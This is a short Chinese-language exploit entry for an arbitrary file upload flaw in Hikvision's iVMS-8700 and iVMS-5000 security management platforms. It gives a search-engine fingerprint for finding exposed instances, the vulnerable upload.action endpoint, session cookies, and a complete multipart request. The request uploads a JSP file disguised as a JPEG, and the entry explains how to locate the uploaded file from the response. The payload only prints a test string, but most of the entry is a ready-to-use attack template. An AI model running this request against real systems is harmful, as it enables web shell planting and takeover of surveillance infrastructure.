# 海康威视iVMS-8700综合安防管理平台upload.action任意文件上传

- **系统**：海康　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`hunter：`web.body="/views/home/file/installPackage.rar"``
- **请求**：`POST /eps/resourceOperations/upload.action HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: ISMS_8700_Sessionname=CA0F207A6372FE883ACA78B74E6DC953; CAS-USERNAME=058; ISMS_8…`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNq…`　`Content-Length: 212`

**请求体 / payload**
```
------WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Disposition: form-data; name="fileUploader";filename="test.jsp"
Content-Type: image/jpeg
<%out.print("hello");%>
------WebKitFormBoundaryTJyhtTNqdMNLZLhj--

根据响应拼接上传文件地址
/eps/upload/ebaae9074e254f829c8de29bb5cfcb1c.jsp
```

**其他**
- 海康威视iVMS-8700综合安防管理平台 upload.action 任意文件上传: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 海康威视综合安防系统iVMS-5000
* 海康威视综合安防系统 iVMS-8700